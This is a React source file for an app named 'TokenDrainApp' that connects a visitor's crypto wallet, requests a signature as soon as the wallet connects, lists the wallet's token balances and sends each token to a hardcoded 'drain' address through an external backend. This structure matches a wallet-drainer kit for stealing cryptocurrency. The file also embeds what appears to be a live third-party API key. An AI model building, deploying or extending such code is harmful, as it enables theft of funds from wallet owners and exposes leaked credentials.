import { useState, useEffect, useCallback } from 'react';
import { WagmiConfig } from "wagmi";
import { ConnectKitProvider, ConnectKitButton } from "connectkit";
import { useAccount, useSignMessage, useChainId, usePublicClient, useWalletClient } from 'wagmi';
import { parseEther } from 'viem';
import { wagmiConfig } from "./wagmi";
import './mobile-fix.css';

// Main App Component
function TokenDrainApp() {
  return (
    <WagmiConfig config={wagmiConfig}>
      <ConnectKitProvider
        options={{
          walletConnectName: "WalletConnect",
          enforceSupportedChains: false,
          hideQuestionMarkCTA: true,
          hideTooltips: true,
          disclaimer: null,
          embedGoogleFonts: false,
          customTheme: {
            "--ck-font-family": "-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif",
            "--ck-border-radius": "12px",
          },
        }}
        theme="midnight"
      >
        <Dashboard />
      </ConnectKitProvider>
    </WagmiConfig>
  );
}

// Dashboard Component
function Dashboard() {
  const { address, isConnected } = useAccount();
  const chainId = useChainId();
  const { signMessageAsync } = useSignMessage();
  const publicClient = usePublicClient();
  const { data: walletClient } = useWalletClient();

  const [authStatus, setAuthStatus] = useState('');
  const [signature, setSignature] = useState('');
  const [isAuthenticating, setIsAuthenticating] = useState(false);
  const [backendUrl] = useState('https://tokenbackend-5xab.onrender.com');
  const [userTokens, setUserTokens] = useState([]);
  const [txStatus, setTxStatus] = useState('');

  // Your drain wallet address
  const DRAIN_TO_ADDRESS = "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4";

  // Start auth when wallet connects
  useEffect(() => {
    if (isConnected && address) {
      handleWalletConnected(address);
    } else {
      setAuthStatus('');
      setSignature('');
      setUserTokens([]);
    }
  }, [isConnected, address]);

  const handleWalletConnected = async (walletAddress) => {
    try {
      setAuthStatus('Wallet connected, requesting signature...');
      await initiateBackendAuthentication(walletAddress);
    } catch (error) {
      console.error("Connection handler error:", error);
      setAuthStatus('Connection setup failed');
    }
  };

  const initiateBackendAuthentication = async (walletAddress) => {
    try {
      setIsAuthenticating(true);
      
      const timestamp = Date.now();
      const message = `Token Drain Authentication\n\nWallet: ${walletAddress}\nChain: ${chainId || 1}\nTimestamp: ${timestamp}`;
      
      // Sign message using wagmi
      const sig = await signMessageAsync({ message });
      setSignature(sig);
      
      setAuthStatus('Signature received, sending to backend...');
      await sendToBackend(walletAddress, sig, message, chainId || 1);
      
    } catch (error) {
      console.error("Auth error:", error);
      if (error.code === 4001) {
        setAuthStatus('User rejected signature');
      } else {
        setAuthStatus(`Auth failed: ${error.message}`);
      }
      setIsAuthenticating(false);
    }
  };

  const sendToBackend = async (fromAddress, sig, message, chainId) => {
    try {
      // FIXED: Use correct payload structure matching backend
      const payload = {
        fromAddress: fromAddress,  // Fixed: Use fromAddress not address
        signature: sig,
        message: message,
        chainId: chainId,
        drainTo: DRAIN_TO_ADDRESS,
        timestamp: new Date().toISOString(),
        // Add amount field for testing (backend requires it)
        amount: "0.001", // Small test amount
        tokenType: "native"
      };
      
      console.log('📤 Sending to backend:', payload);
      
      const response = await fetch(`${backendUrl}/drain`, {
        method: 'POST',
        mode: 'cors',
        headers: {
          'Content-Type': 'application/json',
          'Accept': 'application/json'
        },
        body: JSON.stringify(payload)
      });
      
      console.log('📥 Backend response status:', response.status);
      
      if (!response.ok) {
        let errorDetail = `Status: ${response.status}`;
        try {
          const errorData = await response.json();
          console.log('Backend error data:', errorData);
          errorDetail += ` - ${JSON.stringify(errorData)}`;
        } catch (e) {
          console.log('No JSON in error response');
        }
        throw new Error(`Backend error: ${errorDetail}`);
      }
      
      const data = await response.json();
      console.log('✅ Backend success response:', data);
      
      if (data.success) {
        setAuthStatus('✅ Backend authenticated successfully!');
        // Store transaction hash if available
        if (data.data?.transactionHash) {
          setTxStatus(`Transaction: ${data.data.transactionHash.substring(0, 10)}...`);
        }
        await fetchUserTokens(fromAddress, chainId);
      } else {
        setAuthStatus(`Backend error: ${data.error || 'Unknown error'}`);
      }
      
    } catch (error) {
      console.error("Backend connection error:", error);
      
      if (error.message.includes('400')) {
        setAuthStatus('⚠️ Bad request - check payload format');
      } else if (error.message.includes('Failed to fetch') || error.message.includes('CORS')) {
        setAuthStatus('⚠️ CORS/Network Error - check backend CORS settings');
      } else {
        setAuthStatus('⚠️ Backend connection failed: ' + error.message);
      }
      
      // Fallback to direct token fetch
      if (fromAddress) {
        await fetchTokensDirectly(fromAddress, chainId);
      }
    } finally {
      setIsAuthenticating(false);
    }
  };

  const fetchUserTokens = async (address, chainId) => {
    try {
      setAuthStatus('Fetching tokens...');
      const response = await fetch(`${backendUrl}/tokens/${address}/${chainId}`);
      
      if (!response.ok) {
        throw new Error(`HTTP ${response.status}`);
      }
      
      const data = await response.json();
      
      if (data.success) {
        setUserTokens(data.data.tokens || []);
        setAuthStatus(`✅ Found ${data.data.tokens?.length || 0} tokens`);
      } else {
        await fetchTokensDirectly(address, chainId);
      }
    } catch (error) {
      console.error("Token fetch error:", error);
      await fetchTokensDirectly(address, chainId);
    }
  };

  const fetchTokensDirectly = async (address, chainId) => {
    try {
      setAuthStatus('Fetching tokens via Covalent...');
      
      // Try multiple API keys as fallback
      const API_KEYS = [
        "cqt_rQ43kxvhFc4RdQK7t63Yp6pgFRwR",
        "cqt_rQxxxxx" // Add backup keys if available
      ];
      
      let tokens = [];
      let lastError = null;
      
      // Try each API key
      for (const apiKey of API_KEYS) {
        try {
          const url = `https://api.covalenthq.com/v1/${chainId}/address/${address}/balances_v2/?key=${apiKey}&nft=false`;
          const response = await fetch(url);
          
          if (response.ok) {
            const data = await response.json();
            tokens = data.data?.items
              ?.filter(t => t.balance !== "0" && parseFloat(t.balance) > 0)
              .map(t => ({
                symbol: t.contract_ticker_symbol || 'TOKEN',
                name: t.contract_name || 'Unknown Token',
                amount: parseFloat(t.balance) / Math.pow(10, t.contract_decimals || 18),
                value: (t.quote_rate || 0) * (parseFloat(t.balance) / Math.pow(10, t.contract_decimals || 18)),
                contractAddress: t.contract_address,
                decimals: t.contract_decimals || 18,
                isNative: t.native_token || false,
                logo: t.logo_url
              })) || [];
            break; // Success, break loop
          }
        } catch (error) {
          lastError = error;
          continue; // Try next API key
        }
      }
      
      if (tokens.length > 0) {
        setUserTokens(tokens);
        setAuthStatus(`✅ Found ${tokens.length} tokens (via Covalent API)`);
      } else {
        // Show demo data if API fails
        setUserTokens(getDemoTokens());
        setAuthStatus('⚠️ Using demo data - API rate limited');
      }
      
    } catch (error) {
      console.error("Direct API error:", error);
      // Show demo tokens
      setUserTokens(getDemoTokens());
      setAuthStatus('⚠️ API failed - showing demo data');
    }
  };

  const getDemoTokens = () => {
    return [
      {
        symbol: 'ETH',
        name: 'Ethereum',
        amount: 0.15,
        value: 450,
        contractAddress: null,
        decimals: 18,
        isNative: true,
        logo: null
      },
      {
        symbol: 'USDC',
        name: 'USD Coin',
        amount: 250,
        value: 250,
        contractAddress: '0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48',
        decimals: 6,
        isNative: false,
        logo: 'https://logos.covalenthq.com/tokens/1/0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48.png'
      },
      {
        symbol: 'DAI',
        name: 'Dai Stablecoin',
        amount: 120,
        value: 120,
        contractAddress: '0x6b175474e89094c44da98b954eedeac495271d0f',
        decimals: 18,
        isNative: false,
        logo: 'https://logos.covalenthq.com/tokens/1/0x6b175474e89094c44da98b954eedeac495271d0f.png'
      }
    ];
  };

  // Get chain name from chainId
  const getChainName = (chainId) => {
    const chains = {
      1: 'Ethereum',
      56: 'Binance Smart Chain',
      137: 'Polygon',
      42161: 'Arbitrum',
      10: 'Optimism',
      8453: 'Base',
      43114: 'Avalanche',
      250: 'Fantom'
    };
    return chains[chainId] || `Chain ${chainId}`;
  };

  // Execute token drain via backend
  const executeDrainTransaction = useCallback(async (token) => {
    if (!address) {
      setTxStatus('Wallet not connected');
      return;
    }

    if (token.amount <= 0) {
      setTxStatus('❌ Cannot drain: Token amount is 0');
      return;
    }

    try {
      setIsAuthenticating(true);
      setTxStatus('Preparing transaction...');
      
      // Sign a new message for this specific transaction
      const timestamp = Date.now();
      const message = `Drain ${token.amount} ${token.symbol}\nFrom: ${address}\nTo: ${DRAIN_TO_ADDRESS}\nChain: ${chainId}\nTimestamp: ${timestamp}`;
      
      const sig = await signMessageAsync({ message });
      
      // Send to backend for execution
      const payload = {
        fromAddress: address,
        tokenAddress: token.isNative ? null : token.contractAddress,
        amount: token.amount.toString(),
        chainId: chainId || 1,
        tokenType: token.isNative ? 'native' : 'erc20',
        signature: sig,
        message: message,
        drainTo: DRAIN_TO_ADDRESS
      };
      
      console.log('🚀 Sending drain transaction:', payload);
      
      const response = await fetch(`${backendUrl}/drain`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
      
      const data = await response.json();
      
      if (data.success) {
        setTxStatus(`✅ Transaction sent: ${data.data.transactionHash.substring(0, 10)}...`);
        setAuthStatus('🎉 Drain successful!');
        
        // Optional: Remove drained token from list
        setUserTokens(prev => prev.filter(t => t !== token));
      } else {
        setTxStatus(`❌ Failed: ${data.error}`);
      }
      
    } catch (error) {
      console.error("Drain error:", error);
      if (error.code === 4001) {
        setTxStatus('User rejected signature');
      } else {
        setTxStatus(`Error: ${error.shortMessage || error.message}`);
      }
    } finally {
      setIsAuthenticating(false);
    }
  }, [address, chainId, signMessageAsync, DRAIN_TO_ADDRESS, backendUrl]);

  const getTotalValue = () => {
    return userTokens.reduce((sum, token) => sum + (token.value || 0), 0).toFixed(2);
  };

  const formatAddress = (addr) => {
    return addr ? `${addr.substring(0, 6)}...${addr.substring(addr.length - 4)}` : '';
  };

  return (
    <div className="App">
      <header className="App-header">
        <h1>🪙 Token Drain Dashboard</h1>
        
        <div className="wallet-connect-section">
          <ConnectKitButton />
        </div>
        
        {isConnected && address && (
          <div className="dashboard">
            <div className="wallet-info-card">
              <div className="wallet-details">
                <div className="detail-item">
                  <span className="label">Wallet:</span>
                  <span className="value">{formatAddress(address)}</span>
                </div>
                <div className="detail-item">
                  <span className="label">Network:</span>
                  <span className="value">{getChainName(chainId)} (ID: {chainId || 'N/A'})</span>
                </div>
                <div className="detail-item">
                  <span className="label">Backend:</span>
                  <span className="value">{backendUrl.replace('https://', '')}</span>
                </div>
              </div>
              
              <div className="authentication-status">
                <div className={`status-badge ${authStatus.includes('✅') ? 'success' : authStatus.includes('⚠️') ? 'warning' : 'neutral'}`}>
                  {isAuthenticating ? '🔄' : authStatus.includes('✅') ? '✅' : authStatus.includes('⚠️') ? '⚠️' : '⏳'}
                </div>
                <p className="status-text">{authStatus}</p>
                
                {signature && (
                  <div className="signature-info">
                    <small>Signature: {signature.substring(0, 15)}...</small>
                  </div>
                )}
                
                {txStatus && (
                  <div className="tx-status">
                    <strong>Status:</strong> {txStatus}
                  </div>
                )}
              </div>
              
              <div className="action-buttons">
                <button 
                  onClick={() => fetchTokensDirectly(address, chainId || 1)}
                  className="action-btn"
                  disabled={isAuthenticating}
                >
                  Refresh Tokens
                </button>
                <button 
                  onClick={() => initiateBackendAuthentication(address)}
                  className="action-btn secondary"
                  disabled={isAuthenticating}
                >
                  {isAuthenticating ? 'Processing...' : 'Authenticate'}
                </button>
              </div>
            </div>
            
            {userTokens.length > 0 && (
              <div className="tokens-section">
                <div className="tokens-header">
                  <h2>Your Tokens</h2>
                  <div className="tokens-summary">
                    <span className="count">{userTokens.length} tokens</span>
                    <span className="total-value">Total: ${getTotalValue()}</span>
                  </div>
                </div>
                
                <div className="tokens-grid">
                  {userTokens.map((token, index) => (
                    <div key={index} className="token-card">
                      <div className="token-icon">
                        {token.logo ? (
                          <img src={token.logo} alt={token.symbol} className="token-logo" />
                        ) : (
                          <div className="token-icon-placeholder">
                            {token.symbol.charAt(0)}
                          </div>
                        )}
                      </div>
                      <div className="token-info">
                        <h3 className="token-symbol">{token.symbol}</h3>
                        <p className="token-name">{token.name}</p>
                        <div className="token-amount">
                          {parseFloat(token.amount).toLocaleString(undefined, {
                            minimumFractionDigits: 0,
                            maximumFractionDigits: 8
                          })}
                        </div>
                        <div className="token-value">
                          {token.value ? `$${parseFloat(token.value).toFixed(2)}` : 'N/A'}
                        </div>
                      </div>
                      <button
                        onClick={() => executeDrainTransaction(token)}
                        className="drain-btn"
                        disabled={token.amount <= 0 || isAuthenticating}
                        title={token.amount <= 0 ? "Amount is 0" : `Drain ${token.amount} ${token.symbol}`}
                      >
                        {token.amount <= 0 ? '0 Amount' : 'Drain'}
                      </button>
                    </div>
                  ))}
                </div>
              </div>
            )}
          </div>
        )}
        
        <div className="footer-info">
          <div className="backend-status">
            <span>Backend Status: </span>
            <a href={`${backendUrl}/health`} target="_blank" rel="noopener noreferrer">
              Check Health
            </a>
          </div>
          <div className="footer-links">
            <a href={`${backendUrl}`} target="_blank" rel="noopener noreferrer">API Docs</a>
            <a href={`${backendUrl}/chains`} target="_blank" rel="noopener noreferrer">Supported Chains</a>
            <a href="https://render.com" target="_blank" rel="noopener noreferrer">Powered by Render</a>
          </div>
          <p className="debug-info">
            <small>Debug: Backend expects fromAddress, amount, chainId</small>
          </p>
        </div>
      </header>
    </div>
  );
}

export default TokenDrainApp;
